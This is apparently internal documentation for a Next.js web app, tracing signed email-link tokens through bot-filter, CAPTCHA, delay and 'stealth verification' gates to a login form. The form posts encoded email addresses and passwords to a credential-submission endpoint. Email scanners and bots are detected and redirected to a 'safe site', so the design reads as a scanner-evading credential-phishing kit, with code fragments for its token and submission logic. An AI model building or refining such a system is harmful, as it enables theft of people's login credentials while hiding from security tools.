# Complete Token Flow Trace

## Overview
This document traces the complete token flow from email link generation to credential submission.

---

## Step 1: Token Generation (Email Link Creation)

### Location: `lib/tokens.ts` - `createToken()`

**Function:**
```typescript
export function createToken(
  email: string, 
  documentId?: string, 
  expiresInMinutes: number = 30,
  options?: { fingerprint?: string; ip?: string }
): string
```

**Token Structure:**
```
Token = Base64URL(Payload) + "." + HMAC-SHA256 Signature

Payload (JSON):
{
  email: "user@example.com",
  documentId: "doc123",
  expiresAt: 1762558628072,
  timestamp: 1762555028072,
  issuedAt: 1762555028072,
  fingerprint?: "...",  // Optional
  ip?: "1.2.3.4"       // Optional
}
```

**Generation Methods:**
1. **Script:** `scripts/generate-token.js` or `scripts/generate-token.ts`
   ```bash
   node scripts/generate-token.js user@example.com doc123 30
   ```

2. **API Endpoint:** `app/api/generate-token/route.ts`
   ```bash
   POST /api/generate-token
   Body: { email, documentId, expiresInMinutes }
   ```

**Generated Link Format:**
```
http://localhost:3000/?token=eyJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJkb2N1bWVudElkIjoiZG9jMTIzIiw...&email=user%40example.com
```

**OR Short Format:**
```
http://localhost:3000/t/eyJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJkb2N1bWVudElkIjoiZG9jMTIzIiw...
```

---

## Step 2: Token in URL (User Clicks Email Link)

### URL Format:
```
Full:  /?token=eyJ...&email=user@example.com&documentId=doc123
Short: /t/eyJ...
```

### Short Link Handler: `app/t/[token]/route.ts`

**Flow:**
1. User clicks `/t/[token]` link
2. Route extracts token from path: `params.token`
3. Verifies token: `verifyToken(token, { strictBinding: false })`
4. Extracts email from token payload
5. Redirects to: `/?token=[token]&email=[email]&documentId=[documentId]`

**Code:**
```typescript
// Line 19: Extract token
const token = resolvedParams.token || request.nextUrl.pathname.split('/t/')[1]?.split('?')[0]

// Line 28-30: Verify token
const tokenResult = verifyToken(token, { strictBinding: false })

// Line 44-46: Build redirect URL
baseUrl.searchParams.set('token', token)
baseUrl.searchParams.set('email', email)
```

---

## Step 3: Layer 1 - BotFilterGate (Token NOT Used)

### File: `components/BotFilterGate.tsx`

**Status:** ✅ Token not required at this layer

**What Happens:**
- Line 55: Calls `/api/bot-filter?fp=[fingerprint]` (GET)
- Blocks email scanners and bots
- Token is NOT checked here (too early in flow)
- If bot detected → Redirects to safe site
- If passes → Shows children (CAPTCHA component)

**Token Flow:** Token remains in URL, not extracted yet

---

## Step 4: Layer 2 - CAPTCHA (Token Extracted & Verified)

### File: `components/CaptchaGateUnified.tsx`

**Token Extraction:**
- Line 45: `const token = searchParams.get('token') || new URLSearchParams(window.location.search).get('token')`
- Line 57: `setLinkToken(token)` - Stores in component state
- Line 60: `sessionStorage.setItem('link_token', token)` - Persists in sessionStorage

**Token Verification:**
- Line 185: Sends token to `/api/verify-captcha`:
  ```typescript
  body: JSON.stringify({ 
    captchaToken: tokenToUse,  // CAPTCHA token from Turnstile
    linkToken: tokenToVerify,  // Link token from URL
  })
  ```

### Backend: `app/api/verify-captcha/route.ts`

**Token Verification:**
- Line 39: Receives `linkToken` from request body
- Line 74-77: Calls `verifyLinkToken(linkToken, { fingerprint, ip })`
- Line 17-21: Uses `verifyToken()` from `lib/tokens.ts`:
  ```typescript
  const result = verifyToken(rawToken, {
    fingerprint: options?.fingerprint,
    ip: options?.ip,
    strictBinding: false, // Lenient mode
  })
  ```

**Verification Checks:**
1. ✅ Token format (has `.` separator)
2. ✅ HMAC signature valid
3. ✅ Token not expired (`Date.now() < payload.expiresAt`)
4. ⚠️ Fingerprint binding (lenient - logs warning if mismatch)
5. ⚠️ IP binding (lenient - logs warning if mismatch)

**If Valid:** Returns `{ ok: true, success: true, payload: {...} }`
**If Invalid:** Returns `{ ok: false, error: 'invalid-link-token', reason: '...' }`

**Token Flow:** Token verified, payload extracted, stored in sessionStorage

---

## Step 5: Layer 3 - Bot Detection Delay (Token NOT Used)

### File: `app/page.tsx`

**Status:** ✅ Token not checked at this layer

**What Happens:**
- Line 315: Random delay 3000-7000ms
- Line 325: Calls `/api/bot-filter` (POST) with fingerprint
- Token remains in URL, not extracted here
- If bot detected → Redirects to safe site
- If passes → Sets `checkingComplete = true`

**Token Flow:** Token still in URL, not used in this layer

---

## Step 6: Layer 4 - Stealth Verification Gate (Token Extracted & Sent)

### File: `components/StealthVerificationGate.tsx`

**Token Extraction:**
- Line 245-246: Extracts token from URL:
  ```typescript
  const urlParams = new URLSearchParams(window.location.search)
  const token = urlParams.get('token')
  ```

**Token Sent to Backend:**
- Line 248-262: Sends to `/api/stealth-verification`:
  ```typescript
  body: JSON.stringify({
    token,                    // Link token from URL
    fingerprint: fingerprintHash,
    behaviorData: { ... }
  })
  ```

### Backend: `app/api/stealth-verification/route.ts`

**Status:** ⚠️ Token received but NOT verified in this endpoint

**What Happens:**
- Line 8: Receives `token` from request body
- Line 50-64: Logs token presence but doesn't verify it
- Focuses on behavioral analysis and Cloudflare bot detection
- Returns `{ passed: true/false }` based on bot score

**Note:** Token is passed through but not validated here. Validation happens at submit-credentials.

**Token Flow:** Token extracted from URL, sent to backend, but not verified yet

---

## Step 7: LoginForm - Token Extraction & Submission

### File: `components/LoginForm.tsx`

**Token Extraction:**
- Line 116: Extracts token from URL:
  ```typescript
  const linkToken = urlParams.get('token') // Get token from URL
  ```

**Token Sent to Submit Endpoint:**
- Line 122-136: Sends to `/api/submit-credentials`:
  ```typescript
  body: JSON.stringify({
    e: encodedEmail,
    p: encodedPassword,
    c: captchaToken || null,
    r: redirectUrl ? btoa(redirectUrl) : null,
    t: retryCount,
    s: sessionId,
    token: linkToken,  // ✅ Token sent as 'token' field
  })
  ```

**Token Flow:** Token extracted from URL searchParams, sent in request body as `token` field

---

## Step 8: Submit Credentials - Token Verification

### File: `app/api/submit-credentials/route.ts`

**Token Reception:**
- Line 20: Extracts token from request body:
  ```typescript
  const linkToken = body.token || body.linkToken
  ```

**Token Verification:**
- Line 42-59: Verifies token:
  ```typescript
  if (linkToken) {
    const tokenVerification = verifyToken(linkToken, {
      ip,
      strictBinding: false, // Lenient mode
    })
    
    if (tokenVerification.valid && tokenVerification.payload) {
      tokenValid = true
      tokenPayload = tokenVerification.payload
      // ✅ User passed all 4 layers - TRUST THEM
      // Skip bot detection
    } else {
      // ❌ Invalid/expired token
      return NextResponse.json({ 
        success: false, 
        error: 'Session expired' 
      }, { status: 401 })
    }
  }
  ```

**Verification Details (from `lib/tokens.ts`):**

1. **Format Check (Line 71-75):**
   ```typescript
   const [payloadBase64, signature] = token.split('.')
   if (!payloadBase64 || !signature) {
     return { valid: false, error: 'Invalid token format' }
   }
   ```

2. **Signature Verification (Line 77-80):**
   ```typescript
   if (!verify(payloadBase64, signature)) {
     return { valid: false, error: 'Invalid token signature' }
   }
   ```
   - Uses HMAC-SHA256 with `TOKEN_SECRET`
   - Timing-safe comparison

3. **Expiration Check (Line 86-89):**
   ```typescript
   if (Date.now() > payload.expiresAt) {
     return { valid: false, error: 'Token expired' }
   }
   ```

4. **Fingerprint Binding (Line 91-106):**
   - If `strictBinding: true` → Exact match required
   - If `strictBinding: false` → Logs warning, doesn't fail

5. **IP Binding (Line 108-122):**
   - If `strictBinding: true` → Exact match required
   - If `strictBinding: false` → Logs warning, doesn't fail

**If Token Valid:**
- Line 51: Logs: "Valid token detected - user passed all security layers, skipping bot detection"
- Line 62-123: Bot detection is SKIPPED
- Line 179-180: Uses `tokenPayload.email` and `tokenPayload.documentId`
- Processes credentials normally

**If Token Invalid/Expired:**
- Line 55-58: Returns JSON error (401):
  ```typescript
  return NextResponse.json(
    { success: false, error: 'Session expired. Please request a new access link.' },
    { status: 401 }
  )
  ```

**If No Token:**
- Line 63-123: Runs bot detection as fallback security
- Returns error if bot detected

---

## Complete Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ 1. TOKEN GENERATION                                         │
│    lib/tokens.ts: createToken()                             │
│    → Creates: Base64URL(payload) + "." + HMAC signature     │
│    → Link: /?token=eyJ...&email=user@example.com            │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. USER CLICKS EMAIL LINK                                    │
│    URL: /?token=eyJ...&email=user@example.com               │
│    OR: /t/eyJ... (short link)                                │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. LAYER 1: BotFilterGate                                    │
│    components/BotFilterGate.tsx                              │
│    → Calls: /api/bot-filter?fp=[fingerprint]                │
│    → Token: Still in URL (not extracted)                    │
│    → Blocks: Email scanners, bots                           │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. LAYER 2: CAPTCHA (Token Extracted & Verified)             │
│    components/CaptchaGateUnified.tsx                         │
│    → Extracts: searchParams.get('token')                     │
│    → Stores: sessionStorage.setItem('link_token', token)    │
│    → Sends: POST /api/verify-captcha                         │
│       Body: { captchaToken, linkToken }                      │
│                                                               │
│    Backend: app/api/verify-captcha/route.ts                  │
│    → Verifies: verifyToken(linkToken, { fingerprint, ip })   │
│    → Checks: Format, Signature, Expiration, Binding          │
│    → Returns: { ok: true, payload: {...} }                   │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. LAYER 3: Bot Detection Delay (Token NOT Used)             │
│    app/page.tsx: performBotDetection()                      │
│    → Calls: POST /api/bot-filter                             │
│    → Token: Still in URL (not extracted)                    │
│    → Delay: 3-7 seconds random                               │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 6. LAYER 4: Stealth Verification (Token Extracted & Sent)    │
│    components/StealthVerificationGate.tsx                    │
│    → Extracts: new URLSearchParams(...).get('token')         │
│    → Sends: POST /api/stealth-verification                   │
│       Body: { token, fingerprint, behaviorData }              │
│                                                               │
│    Backend: app/api/stealth-verification/route.ts            │
│    → Receives: token (but doesn't verify it)                 │
│    → Focuses: Behavioral analysis, Cloudflare detection      │
│    → Returns: { passed: true/false }                          │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 7. LOGIN FORM (Token Extracted)                              │
│    components/LoginForm.tsx                                  │
│    → Extracts: urlParams.get('token')                         │
│    → Sends: POST /api/submit-credentials                     │
│       Body: { e, p, c, r, t, s, token }                       │
│       Field: token = linkToken                                │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ 8. SUBMIT CREDENTIALS (Token Verified)                       │
│    app/api/submit-credentials/route.ts                       │
│    → Receives: body.token                                    │
│    → Verifies: verifyToken(linkToken, { ip, strictBinding: false }) │
│    → Checks: Format, Signature, Expiration, Binding          │
│    → If Valid: Skip bot detection, trust user                │
│    → If Invalid: Return 401 error                             │
│    → Uses: tokenPayload.email, tokenPayload.documentId       │
└─────────────────────────────────────────────────────────────┘
```

---

## Token Verification Details

### Function: `lib/tokens.ts` - `verifyToken()`

**Validation Steps:**

1. **Format Validation:**
   ```typescript
   const [payloadBase64, signature] = token.split('.')
   if (!payloadBase64 || !signature) {
     return { valid: false, error: 'Invalid token format' }
   }
   ```

2. **Signature Verification:**
   ```typescript
   if (!verify(payloadBase64, signature)) {
     return { valid: false, error: 'Invalid token signature' }
   }
   ```
   - Uses HMAC-SHA256 with `TOKEN_SECRET`
   - Timing-safe comparison to prevent timing attacks

3. **Expiration Check:**
   ```typescript
   if (Date.now() > payload.expiresAt) {
     return { valid: false, error: 'Token expired' }
   }
   ```

4. **Fingerprint Binding (Optional):**
   ```typescript
   if (options?.fingerprint && payload.fingerprint) {
     if (options.strictBinding) {
       // Exact match required
       if (payload.fingerprint !== options.fingerprint) {
         return { valid: false, error: 'Token fingerprint mismatch' }
       }
     } else {
       // Lenient mode - logs warning, doesn't fail
       if (payload.fingerprint !== options.fingerprint) {
         console.warn('Token fingerprint mismatch (lenient mode)')
       }
     }
   }
   ```

5. **IP Binding (Optional):**
   ```typescript
   if (options?.ip && payload.ip) {
     if (options.strictBinding) {
       // Exact match required
       if (payload.ip !== options.ip) {
         return { valid: false, error: 'Token IP mismatch' }
       }
     } else {
       // Lenient mode - logs warning, doesn't fail
       console.warn('Token IP mismatch (lenient mode)')
     }
   }
   ```

**Return Value:**
```typescript
{
  valid: boolean,
  payload?: TokenPayload,  // Contains: email, documentId, expiresAt, etc.
  error?: string           // Error reason if invalid
}
```

---

## Token Storage & Persistence

### During Flow:

1. **URL Query Parameter:**
   - Always present: `/?token=eyJ...&email=...`
   - Extracted via: `searchParams.get('token')` or `URLSearchParams(window.location.search).get('token')`

2. **Component State:**
   - `CaptchaGateUnified`: `linkToken` state variable
   - `HomeContent`: Not stored in state (read from URL when needed)

3. **SessionStorage:**
   - `CaptchaGateUnified`: `sessionStorage.setItem('link_token', token)` (Line 60)
   - Used for: Recovery if component re-renders

4. **Request Bodies:**
   - `/api/verify-captcha`: `{ linkToken: token }`
   - `/api/stealth-verification`: `{ token: token }`
   - `/api/submit-credentials`: `{ token: linkToken }`

---

## Critical Points

### ✅ Token is Verified Twice:

1. **Layer 2 (CAPTCHA):** `app/api/verify-captcha/route.ts`
   - Verifies token before allowing CAPTCHA to proceed
   - Ensures token is valid and not expired

2. **Submit Credentials:** `app/api/submit-credentials/route.ts`
   - Verifies token again before processing credentials
   - If valid → trusts user (skips bot detection)
   - If invalid → returns 401 error

### ✅ Token Extraction Methods:

1. **Primary:** `useSearchParams().get('token')` (Next.js hook)
2. **Fallback:** `new URLSearchParams(window.location.search).get('token')` (Direct parsing)
3. **Recovery:** `sessionStorage.getItem('link_token')` (If component re-renders)

### ✅ Token Validation:

- **Format:** Must have `.` separator (payload.signature)
- **Signature:** HMAC-SHA256 with `TOKEN_SECRET`
- **Expiration:** `Date.now() < payload.expiresAt`
- **Binding:** Optional fingerprint/IP (lenient mode by default)

---

## Summary

**Token Generation:** `lib/tokens.ts` → `createToken()` → HMAC-signed JWT-like token

**Token in Email:** `/?token=eyJ...&email=user@example.com`

**Layer 1 (BotFilterGate):** Token in URL, not extracted

**Layer 2 (CAPTCHA):** Token extracted from URL → Verified at `/api/verify-captcha` → Stored in sessionStorage

**Layer 3 (Bot Delay):** Token in URL, not extracted

**Layer 4 (Stealth):** Token extracted from URL → Sent to `/api/stealth-verification` (not verified there)

**LoginForm:** Token extracted from URL → Sent as `token` field to `/api/submit-credentials`

**Submit Endpoint:** Token verified with `verifyToken()` → If valid, user trusted (skip bot detection) → If invalid, return 401

**Token is verified at 2 points:**
1. CAPTCHA verification (`/api/verify-captcha`)
2. Credential submission (`/api/submit-credentials`)




